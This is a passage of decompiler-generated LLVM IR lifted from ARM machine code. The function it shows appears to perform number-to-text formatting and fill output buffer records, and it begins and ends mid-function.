  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_1206c = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_1206c, i32* %r3.global-to-local, align 4
  %v0_12078 = load i32, i32* %r2.global-to-local, align 4
  %v1_12078 = inttoptr i32 %v0_12078 to i8*
  %v2_12078 = load i8, i8* %v1_12078, align 1
  %v3_12078 = zext i8 %v2_12078 to i32
  store i32 %v3_12078, i32* %r3.global-to-local, align 4
  %v5_12078 = add i32 %v0_12078, 1
  store i32 %v5_12078, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_12078, i32* %stack_var_-38, align 4
  %v2_1208c = sub i32 %v1_1208c, %v5_12078
  store i32 %v2_1208c, i32* %r1.global-to-local, align 4
  %v2_12090 = xor i1 %v1_12094, %v0_12094
  br i1 %v2_12090, label %.thread166, label %dec_label_pc_12098

.thread166:                                       ; preds = %dec_label_pc_12060
  %v5_12090 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_12090, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12108

dec_label_pc_12098:                               ; preds = %dec_label_pc_12060
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1209c = sub i32 %v0_120f8, %v2_1208c
  %v4_1209c = xor i32 %v2_1208c, %v0_120f8
  %v5_1209c = xor i32 %v2_1209c, %v0_120f8
  %v6_1209c = and i32 %v5_1209c, %v4_1209c
  %v7_1209c = icmp slt i32 %v6_1209c, 0
  store i1 %v7_1209c, i1* %cpsr_v.global-to-local, align 1
  %v8_1209c = icmp slt i32 %v2_1209c, 0
  store i1 %v8_1209c, i1* %cpsr_n.global-to-local, align 1
  %v9_1209c = icmp eq i32 %v0_120f8, %v2_1208c
  store i1 %v9_1209c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_120a8 = xor i1 %v8_1209c, %v7_1209c
  br i1 %v2_120a8, label %dec_label_pc_120e4, label %dec_label_pc_120ac

dec_label_pc_120ac:                               ; preds = %dec_label_pc_12098
  store i32 %v2_1209c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_1209c, i1* %cpsr_n.global-to-local, align 1
  %v2_120b0 = icmp eq i32 %v2_1209c, 0
  store i1 %v2_120b0, i1* %cpsr_z.global-to-local, align 1
  %tmp259 = icmp slt i32 %v2_1209c, 1
  br i1 %tmp259, label %.thread168, label %dec_label_pc_120c4

.thread168:                                       ; preds = %dec_label_pc_120ac
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12104

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120ac
  store i32 ptrtoint (i32* @global_var_180cf.556 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_120d0 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_120d0, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_12108

dec_label_pc_120e4:                               ; preds = %dec_label_pc_12098
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_120e4 = icmp slt i32 %v0_120f8, 0
  store i1 %v1_120e4, i1* %cpsr_n.global-to-local, align 1
  %v2_120e4 = icmp eq i32 %v0_120f8, 0
  store i1 %v2_120e4, i1* %cpsr_z.global-to-local, align 1
  %tmp260 = icmp slt i32 %v0_120f8, 1
  br i1 %tmp260, label %dec_label_pc_12104, label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120e4
  %v2_120f8 = sub i32 %v2_1208c, %v0_120f8
  store i32 %v2_120f8, i32* %r1.global-to-local, align 4
  %v2_120fc = add i32 %v5_12078, %v0_120f8
  store i32 %v2_120fc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120f4, %.thread168, %dec_label_pc_120e4
  %storemerge180.in = phi i32* [ %stack_var_-152, %dec_label_pc_120e4 ], [ %stack_var_-140, %.thread168 ], [ %stack_var_-140, %dec_label_pc_120f4 ]
  %v0_1211c89 = phi i32 [ %v2_1208c, %dec_label_pc_120e4 ], [ 0, %.thread168 ], [ %v2_120f8, %dec_label_pc_120f4 ]
  %storemerge180 = ptrtoint i32* %storemerge180.in to i32
  store i32 %storemerge180, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12108

dec_label_pc_12108:                               ; preds = %.thread166, %dec_label_pc_120c4, %dec_label_pc_12104
  %v1_12140 = phi i32 [ %v2_120d0, %dec_label_pc_120c4 ], [ %storemerge180, %dec_label_pc_12104 ], [ %v5_12090, %.thread166 ]
  %v0_1215897 = phi i32 [ -1, %dec_label_pc_120c4 ], [ -1, %dec_label_pc_12104 ], [ %v0_120f8, %.thread166 ]
  %v0_1211c = phi i32 [ 0, %dec_label_pc_120c4 ], [ %v0_1211c89, %dec_label_pc_12104 ], [ %v2_1208c, %.thread166 ]
  %v2_12108 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_12108, i32* %r2.global-to-local, align 4
  %v1_1210c = add i32 %v2_12108, 12
  %v2_1210c = inttoptr i32 %v1_1210c to i32*
  %v3_1210c = load i32, i32* %v2_1210c, align 4
  %v1_12110 = and i32 %v3_1210c, 16
  store i32 %v1_12110, i32* @lr, align 4
  %v2_12110 = icmp eq i32 %v1_12110, 0
  %tmp283 = zext i1 %v2_12110 to i32
  %.275 = xor i32 %tmp283, 1
  store i32 %.275, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1211c = icmp slt i32 %v0_1211c, 0
  store i1 %v1_1211c, i1* %cpsr_n.global-to-local, align 1
  %v2_1211c = icmp eq i32 %v0_1211c, 0
  store i1 %v2_1211c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1211c, label %bb263, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_12108
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1213c

bb263:                                            ; preds = %dec_label_pc_12108
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_12110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12110, label %dec_label_pc_1212c, label %dec_label_pc_1213c

dec_label_pc_1212c:                               ; preds = %bb263
  store i32 %v1_121b4, i32* %r3.global-to-local, align 4
  %v0_12130 = load i32, i32* @sl, align 4
  %v1_12130 = add i32 %v0_12130, -103
  %v3_12130 = sub i32 102, %v0_12130
  %v4_12130 = and i32 %v3_12130, %v0_12130
  %v5_12130 = icmp slt i32 %v4_12130, 0
  store i1 %v5_12130, i1* %cpsr_v.global-to-local, align 1
  %v6_12130 = icmp slt i32 %v1_12130, 0
  store i1 %v6_12130, i1* %cpsr_n.global-to-local, align 1
  %v7_12130 = icmp eq i32 %v0_12130, 103
  store i1 %v7_12130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12130, label %dec_label_pc_12158, label %bb264

bb264:                                            ; preds = %dec_label_pc_1212c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_12134 = icmp slt i32 %v1_121b4, 0
  store i1 %v2_12134, i1* %cpsr_n.global-to-local, align 1
  %v3_12134 = icmp eq i32 %v1_121b4, 0
  store i1 %v3_12134, i1* %cpsr_z.global-to-local, align 1
  %tmp265 = icmp slt i32 %v1_121b4, 1
  br i1 %tmp265, label %dec_label_pc_12158, label %dec_label_pc_1213c

dec_label_pc_1213c:                               ; preds = %.thread40, %bb263, %bb264
  %v2_12140 = inttoptr i32 %v1_12140 to i32*
  store i32 112, i32* %v2_12140, align 4
  %v1_12148 = load i32, i32* %r6.global-to-local, align 4
  %v2_12148 = add i32 %v1_12148, 4
  %v3_12148 = inttoptr i32 %v2_12148 to i32*
  store i32 1, i32* %v3_12148, align 4
  store i32 ptrtoint (i32* @global_var_180dc.558 to i32), i32* %r3.global-to-local, align 4
  %v1_12150 = load i32, i32* %r6.global-to-local, align 4
  %v2_12150 = add i32 %v1_12150, 8
  %v3_12150 = inttoptr i32 %v2_12150 to i32*
  store i32 ptrtoint (i32* @global_var_180dc.558 to i32), i32* %v3_12150, align 4
  %v0_12154 = load i32, i32* %r6.global-to-local, align 4
  %v1_12154 = add i32 %v0_12154, 12
  store i32 %v1_12154, i32* %r6.global-to-local, align 4
  %v0_12158.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12158

dec_label_pc_12158:                               ; preds = %dec_label_pc_1212c, %bb264, %dec_label_pc_1213c
  %v1_12164 = phi i32 [ %v1_12140, %bb264 ], [ %v1_12154, %dec_label_pc_1213c ], [ %v1_12140, %dec_label_pc_1212c ]
  %v0_12158 = phi i32 [ %v0_1215897, %bb264 ], [ %v0_12158.pre, %dec_label_pc_1213c ], [ %v0_1215897, %dec_label_pc_1212c ]
  %v1_12158 = add i32 %v0_12158, 1
  store i32 %v1_12158, i32* %ip.global-to-local, align 4
  %v3_12158 = sub i32 0, %v0_12158
  %v4_12158 = and i32 %v1_12158, %v3_12158
  %v5_12158 = icmp slt i32 %v4_12158, 0
  store i1 %v5_12158, i1* %cpsr_v.global-to-local, align 1
  %v6_12158 = icmp slt i32 %v1_12158, 0
  store i1 %v6_12158, i1* %cpsr_n.global-to-local, align 1
  %v7_12158 = icmp eq i32 %v1_12158, 0
  store i1 %v7_12158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12158, label %dec_label_pc_1217c, label %dec_label_pc_12160

dec_label_pc_12160:                               ; preds = %dec_label_pc_12158
  %v1_12160 = sub i32 -1, %v0_12158
  %v2_12164 = add i32 %v1_12164, 4
  %v3_12164 = inttoptr i32 %v2_12164 to i32*
  store i32 %v1_12160, i32* %v3_12164, align 4
  store i32 ptrtoint (i32* @global_var_180cf.556 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_12170 = load i32, i32* %r6.global-to-local, align 4
  %v2_12170 = inttoptr i32 %v1_12170 to i32*
  store i32 176, i32* %v2_12170, align 4
  %v0_12174 = load i32, i32* %r3.global-to-local, align 4
  %v1_12174 = load i32, i32* %r6.global-to-local, align 4
  %v2_12174 = add i32 %v1_12174, 8
  %v3_12174 = inttoptr i32 %v2_12174 to i32*
  store i32 %v0_12174, i32* %v3_12174, align 4
  %v0_12178 = load i32, i32* %r6.global-to-local, align 4
  %v1_12178 = add i32 %v0_12178, 12
  store i32 %v1_12178, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1217c

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12158, %dec_label_pc_12160
  %v2_12184 = phi i32 [ %v1_12164, %dec_label_pc_12158 ], [ %v1_12178, %dec_label_pc_12160 ]
  %v0_1217c = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1217c = icmp slt i32 %v0_1217c, 0
  store i1 %v1_1217c, i1* %cpsr_n.global-to-local, align 1
  %v2_1217c = icmp eq i32 %v0_1217c, 0
  store i1 %v2_1217c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1217c, label %.thread49, label %bb266

bb266:                                            ; preds = %dec_label_pc_1217c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_12184 = inttoptr i32 %v2_12184 to i32*
  store i32 112, i32* %v3_12184, align 4
  %v1_12188 = load i32, i32* %r4.global-to-local, align 4
  %v2_12188 = load i32, i32* %r6.global-to-local, align 4
  %v3_12188 = add i32 %v2_12188, 8
  %v4_12188 = inttoptr i32 %v3_12188 to i32*
  store i32 %v1_12188, i32* %v4_12188, align 4
  %v1_1218c = load i32, i32* %r1.global-to-local, align 4
  %v2_1218c = load i32, i32* %r6.global-to-local, align 4
  %v3_1218c = add i32 %v2_1218c, 4
  %v4_1218c = inttoptr i32 %v3_1218c to i32*
  store i32 %v1_1218c, i32* %v4_1218c, align 4
  %v1_12190 = load i32, i32* %r6.global-to-local, align 4
  %v2_12190 = add i32 %v1_12190, 12
  store i32 %v2_12190, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_1217c, %bb266
  %v1_121b8 = phi i32 [ %v2_12184, %dec_label_pc_1217c ], [ %v2_12190, %bb266 ]
  %v0_12194 = load i32, i32* @sl, align 4
  %v1_12194 = add i32 %v0_12194, -103
  %v3_12194 = sub i32 102, %v0_12194
  %v4_12194 = and i32 %v3_12194, %v0_12194
  %v5_12194 = icmp slt i32 %v4_12194, 0
  store i1 %v5_12194, i1* %cpsr_v.global-to-local, align 1
  %v6_12194 = icmp slt i32 %v1_12194, 0
  store i1 %v6_12194, i1* %cpsr_n.global-to-local, align 1
  %v7_12194 = icmp eq i32 %v0_12194, 103
  store i1 %v7_12194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12194, label %dec_label_pc_1219c, label %dec_label_pc_121a4

dec_label_pc_1219c:                               ; preds = %.thread49
  %v0_1219c = load i32, i32* @lr, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1219c = icmp slt i32 %v0_1219c, 0
  store i1 %v1_1219c, i1* %cpsr_n.global-to-local, align 1
  %v2_1219c = icmp eq i32 %v0_1219c, 0
  store i1 %v2_1219c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1219c, label %dec_label_pc_121d0, label %dec_label_pc_121a4

dec_label_pc_121a4:                               ; preds = %.thread49, %dec_label_pc_1219c
  %v0_121a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_121a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_121a4 = sub i32 %v1_121a4, %v0_121a4
  store i32 %v2_121a4, i32* %r3.global-to-local, align 4
  store i32 %v1_121b4, i32* %ip.global-to-local, align 4
  %v2_121ac = sub i32 %v2_121a4, %v1_121b4
  %v4_121ac = xor i32 %v2_121a4, %v1_121b4
  %v5_121ac = xor i32 %v2_121ac, %v2_121a4
  %v6_121ac = and i32 %v5_121ac, %v4_121ac
  %v7_121ac = icmp slt i32 %v6_121ac, 0
  store i1 %v7_121ac, i1* %cpsr_v.global-to-local, align 1
  %v8_121ac = icmp slt i32 %v2_121ac, 0
  store i1 %v8_121ac, i1* %cpsr_n.global-to-local, align 1
  %v9_121ac = icmp eq i32 %v2_121a4, %v1_121b4
  store i1 %v9_121ac, i1* %cpsr_z.global-to-local, align 1
  %v2_121b0 = xor i1 %v8_121ac, %v7_121ac
  br i1 %v2_121b0, label %dec_label_pc_121b4, label %dec_label_pc_121d0

dec_label_pc_121b4:                               ; preds = %dec_label_pc_121a4
  %v2_121b4 = sub i32 %v1_121b4, %v2_121a4
  %v2_121b8 = add i32 %v1_121b8, 4
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  store i32 %v2_121b4, i32* %v3_121b8, align 4
  store i32 ptrtoint (i32* @global_var_180cf.556 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_121c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_121c4 = inttoptr i32 %v1_121c4 to i32*
  store i32 176, i32* %v2_121c4, align 4
  %v0_121c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_121c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_121c8 = add i32 %v1_121c8, 8
  %v3_121c8 = inttoptr i32 %v2_121c8 to i32*
  store i32 %v0_121c8, i32* %v3_121c8, align 4
  %v0_121cc = load i32, i32* %r6.global-to-local, align 4
  %v1_121cc = add i32 %v0_121cc, 12
  store i32 %v1_121cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %dec_label_pc_121a4, %dec_label_pc_1219c, %dec_label_pc_121b4
  %v1_12264.pre.pre = phi i32 [ %v1_121b8, %dec_label_pc_121a4 ], [ %v1_121b8, %dec_label_pc_1219c ], [ %v1_121cc, %dec_label_pc_121b4 ]
  %v0_121d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_121d0 = add i32 %v0_121d0, -102
  %v3_121d0 = sub i32 101, %v0_121d0
  %v4_121d0 = and i32 %v3_121d0, %v0_121d0
  %v5_121d0 = icmp slt i32 %v4_121d0, 0
  store i1 %v5_121d0, i1* %cpsr_v.global-to-local, align 1
  %v6_121d0 = icmp slt i32 %v1_121d0, 0
  store i1 %v6_121d0, i1* %cpsr_n.global-to-local, align 1
  %v7_121d0 = icmp eq i32 %v0_121d0, 102
  store i1 %v7_121d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_121d0, label %dec_label_pc_12258, label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_121d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_121dc = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_121dc = icmp slt i32 %v0_121dc, 0
  store i1 %v1_121dc, i1* %cpsr_n.global-to-local, align 1
  %v2_121dc = icmp eq i32 %v0_121dc, 0
  store i1 %v2_121dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0130137, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_121f0 = sub i32 0, %v0_121dc
  %storemerge179 = select i1 %v1_121dc, i32 %v4_121f0, i32 %v0_121dc
  %tmp284 = ashr i32 %v0_121dc, 31
  %tmp285 = and i32 %tmp284, 2
  %tmp286 = add nuw nsw i32 %tmp285, 43
  store i32 %storemerge179, i32* %r4.global-to-local, align 4
  store i32 %tmp286, i32* %sl.global-to-local, align 4
  %v2_121f8 = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_121f8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12200

dec_label_pc_12200:                               ; preds = %dec_label_pc_12230, %dec_label_pc_12200, %dec_label_pc_121d8
  %v0_12200 = phi i32 [ %storemerge179, %dec_label_pc_121d8 ], [ %v0_1221c, %dec_label_pc_12200 ], [ %v0_1221c, %dec_label_pc_12230 ]
  store i32 %v0_12200, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_12208 = call i32 @function_cafc(i32 %v0_12200, i32 10)
  %v1_1220c = add i32 %v2_12208, 48
  store i32 %v1_1220c, i32* %r3.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_12214 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12214, i32* @r0, align 4
  %v1_12218 = trunc i32 %v1_1220c to i8
  %v2_12218 = load i32, i32* %r5.global-to-local, align 4
  %v3_12218 = add i32 %v2_12218, -1
  %v4_12218 = inttoptr i32 %v3_12218 to i8*
  store i8 %v1_12218, i8* %v4_12218, align 1
  %v5_12218 = load i32, i32* %r5.global-to-local, align 4
  %v6_12218 = add i32 %v5_12218, -1
  store i32 %v6_12218, i32* %r5.global-to-local, align 4
  %v0_1221c = call i32 @function_15030()
  store i32 %v0_1221c, i32* %r0.global-to-local, align 4
  %v0_12220 = load i32, i32* %r7.global-to-local, align 4
  %v1_12220 = add i32 %v0_12220, 1
  store i32 %v1_12220, i32* %r7.global-to-local, align 4
  %v1_12224 = add i32 %v0_12220, -2
  %v3_12224 = sub i32 1, %v0_12220
  %v4_12224 = and i32 %v3_12224, %v1_12220
  %v5_12224 = icmp slt i32 %v4_12224, 0
  store i1 %v5_12224, i1* %cpsr_v.global-to-local, align 1
  %v6_12224 = icmp slt i32 %v1_12224, 0
  store i1 %v6_12224, i1* %cpsr_n.global-to-local, align 1
  %v7_12224 = icmp eq i32 %v1_12220, 3
  store i1 %v7_12224, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1221c, i32* %r4.global-to-local, align 4
  %v7_1222c = icmp slt i32 %v1_12220, 4
  br i1 %v7_1222c, label %dec_label_pc_12200, label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_12200
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12230 = icmp slt i32 %v0_1221c, 0
  store i1 %v1_12230, i1* %cpsr_n.global-to-local, align 1
  %v2_12230 = icmp eq i32 %v0_1221c, 0
  store i1 %v2_12230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12230, label %dec_label_pc_12238, label %dec_label_pc_12200

dec_label_pc_12238:                               ; preds = %dec_label_pc_12230
  %v0_12238 = load i32, i32* %r5.global-to-local, align 4
  %v1_12238 = add i32 %v0_12238, -1
  store i32 %v1_12238, i32* %r3.global-to-local, align 4
  %v0_1223c = load i32, i32* %sl.global-to-local, align 4
  %v1_1223c = trunc i32 %v0_1223c to i8
  %v4_1223c = inttoptr i32 %v1_12238 to i8*
  store i8 %v1_1223c, i8* %v4_1223c, align 1
  %v0_12240 = load i32, i32* %r3.global-to-local, align 4
  %v1_12240 = add i32 %v0_12240, -1
  store i32 %v1_12240, i32* %r2.global-to-local, align 4
  %v0_12244 = load i32, i32* %r8.global-to-local, align 4
  %v1_12244 = trunc i32 %v0_12244 to i8
  %v4_12244 = inttoptr i32 %v1_12240 to i8*
  store i8 %v1_12244, i8* %v4_12244, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_1224c = load i32, i32* %r6.global-to-local, align 4
  %v1_1224c = inttoptr i32 %v0_1224c to i32*
  store i32 112, i32* %v1_1224c, align 4
  %v3_1224c = add i32 %v0_1224c, 4
  %v4_1224c = inttoptr i32 %v3_1224c to i32*
  %v5_1224c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_1224c, i32* %v4_1224c, align 4
  %v0_12250 = load i32, i32* %r2.global-to-local, align 4
  %v1_12250 = load i32, i32* %r6.global-to-local, align 4
  %v2_12250 = add i32 %v1_12250, 8
  %v3_12250 = inttoptr i32 %v2_12250 to i32*
  store i32 %v0_12250, i32* %v3_12250, align 4
  %v0_12254 = load i32, i32* %r6.global-to-local, align 4
  %v1_12254 = add i32 %v0_12254, 12
  store i32 %v1_12254, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12258

dec_label_pc_12258:                               ; preds = %dec_label_pc_121d0, %.thread121, %dec_label_pc_12238
  %v1_12264.pre = phi i32 [ %v2_11d10, %.thread121 ], [ %v1_12254, %dec_label_pc_12238 ], [ %v1_12264.pre.pre, %dec_label_pc_121d0 ]
  %v2_12258 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_12258, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1225c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_1225c, %dec_label_pc_12258
  %v0_1225c = phi i32 [ %v2_12258, %dec_label_pc_12258 ], [ %v4_1225c, %dec_label_pc_1225c ]
  %stack_var_-188.0 = phi i32 [ %v3_11bc0, %dec_label_pc_12258 ], [ %v2_12268, %dec_label_pc_1225c ]
  %v1_1225c = inttoptr i32 %v0_1225c to i32*
  %v2_1225c = load i32, i32* %v1_1225c, align 4
  store i32 %v2_1225c, i32* %r3.global-to-local, align 4
  %v4_1225c = add i32 %v0_1225c, 12
  store i32 %v4_1225c, i32* %r2.global-to-local, align 4
  %v3_12264 = icmp ult i32 %v4_1225c, %v1_12264.pre
  %v2_12268 = sub i32 %stack_var_-188.0, %v2_1225c
  store i32 %v2_12268, i32* %r0.global-to-local, align 4
  br i1 %v3_12264, label %dec_label_pc_1225c, label %dec_label_pc_12274

dec_label_pc_12274:                               ; preds = %dec_label_pc_1225c
  %v3_12274 = load i8, i8* %stack_var_-42, align 1
  %v4_12274 = sext i8 %v3_12274 to i32
  store i32 %v4_12274, i32* %r3.global-to-local, align 4
  store i32 %v4_12274, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12278 = icmp slt i8 %v3_12274, 0
  store i1 %v1_12278, i1* %cpsr_n.global-to-local, align 1
  %v2_12278 = icmp eq i8 %v3_12274, 0
  store i1 %v2_12278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12278, label %bb271, label %bb270

bb270:                                            ; preds = %dec_label_pc_12274
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb271

bb271:                                            ; preds = %dec_label_pc_12274, %bb270
  %v1_122cc = phi i32 [ %v4_12274, %dec_label_pc_12274 ], [ 1, %bb270 ]
  %v2_12280 = sub i32 %v2_12268, %v1_122cc
  store i32 %v2_12280, i32* %r1.global-to-local, align 4
  %v2_12284 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_12284, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1228c = icmp slt i32 %v2_12280, 0
  store i1 %v1_1228c, i1* %cpsr_n.global-to-local, align 1
  %v2_1228c = icmp eq i32 %v2_12280, 0
  store i1 %v2_1228c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp272 = icmp slt i32 %v2_12280, 1
  br i1 %tmp272, label %dec_label_pc_122f4, label %dec_label_pc_122a0

dec_label_pc_122a0:                               ; preds = %bb271
  %v2_122a0 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_122a0, i32* %ip.global-to-local, align 4
  %v1_122a4 = add i32 %v2_122a0, 12
  %v2_122a4 = inttoptr i32 %v1_122a4 to i32*
  %v3_122a4 = load i32, i32* %v2_122a4, align 4
  store i32 %v3_122a4, i32* %r3.global-to-local, align 4
  %v1_122a8 = and i32 %v3_122a4, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_122a8 = icmp eq i32 %v1_122a8, 0
  store i1 %v2_122a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_122a8, label %dec_label_pc_122c0, label %dec_label_pc_122b0

dec_label_pc_122b0:                               ; preds = %dec_label_pc_122a0
  store i32 ptrtoint (i32* @global_var_180cf.556 to i32), i32* %r3.global-to-local, align 4
  %v1_122b4 = add i32 %v1_12264.pre, 12
  store i32 %v1_122b4, i32* %r5.global-to-local, align 4
  %v1_122b8 = inttoptr i32 %v1_12264.pre to i32*
  store i32 160, i32* %v1_122b8, align 4
  %v3_122b8 = add i32 %v1_12264.pre, 4
  %v4_122b8 = inttoptr i32 %v3_122b8 to i32*
  %v5_122b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_122b8, i32* %v4_122b8, align 4
  %v6_122b8 = add i32 %v1_12264.pre, 8
  %v7_122b8 = inttoptr i32 %v6_122b8 to i32*
  %v8_122b8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_122b8, i32* %v7_122b8, align 4
  br label %dec_label_pc_122f8

dec_label_pc_122c0:                               ; preds = %dec_label_pc_122a0
  store i32 %v2_122a0, i32* %r0.global-to-local, align 4
  %v1_122c4 = add i32 %v2_122a0, 16
  %v2_122c4 = inttoptr i32 %v1_122c4 to i32*
  %v3_122c4 = load i32, i32* %v2_122c4, align 4
  store i32 %v3_122c4, i32* %r3.global-to-local, align 4
  %v1_122c8 = add i32 %v3_122c4, -48
  %v3_122c8 = sub i32 47, %v3_122c4
  %v4_122c8 = and i32 %v3_122c8, %v3_122c4
  %v5_122c8 = icmp slt i32 %v4_122c8, 0
  store i1 %v5_122c8, i1* %cpsr_v.global-to-local, align 1
  %v6_122c8 = icmp slt i32 %v1_122c8, 0
  store i1 %v6_122c8, i1* %cpsr_n.global-to-local, align 1
  %v7_122c8 = icmp eq i32 %v3_122c4, 48
  store i1 %v7_122c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_122c8, label %dec_label_pc_122d8, label %bb273

bb273:                                            ; preds = %dec_label_pc_122c0
  store i32 %v2_12268, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_122f4

dec_label_pc_122d8:                               ; preds = %dec_label_pc_122c0
  %v3_122d8 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_12264.pre, i32* %r5.global-to-local, align 4
  %v2_122e0 = add i32 %v3_122d8, %v2_12280
  store i32 %v2_122e0, i32* %r3.global-to-local, align 4
  store i32 %v2_122e0, i32* %stack_var_-160, align 4
  br label %dec_label_pc_122f8

dec_label_pc_122ec:                               ; preds = %dec_label_pc_12300
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12330

dec_label_pc_122f4:                               ; preds = %bb273, %bb271
  store i32 %v1_12264.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_122f8

dec_label_pc_122f8:                               ; preds = %dec_label_pc_122d8, %dec_label_pc_122b0, %dec_label_pc_122f4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_122fc = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_122fc, i32* %r4.global-to-local, align 4
  %v3_12308.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_12300

dec_label_pc_12300:                               ; preds = %dec_label_pc_12328, %dec_label_pc_122f8
  %v0_12300 = phi i32 [ %v1_12320, %dec_label_pc_12328 ], [ %v2_122fc, %dec_label_pc_122f8 ]
  %v1_12300 = inttoptr i32 %v0_12300 to i32*
  %v2_12300 = load i32, i32* %v1_12300, align 4
  store i32 %v2_12300, i32* %r1.global-to-local, align 4
  %v3_12300 = add i32 %v0_12300, 4
  %v4_12300 = inttoptr i32 %v3_12300 to i32*
  %v5_12300 = load i32, i32* %v4_12300, align 4
  store i32 %v5_12300, i32* %r2.global-to-local, align 4
  %v6_12300 = add i32 %v0_12300, 8
  %v7_12300 = inttoptr i32 %v6_12300 to i32*
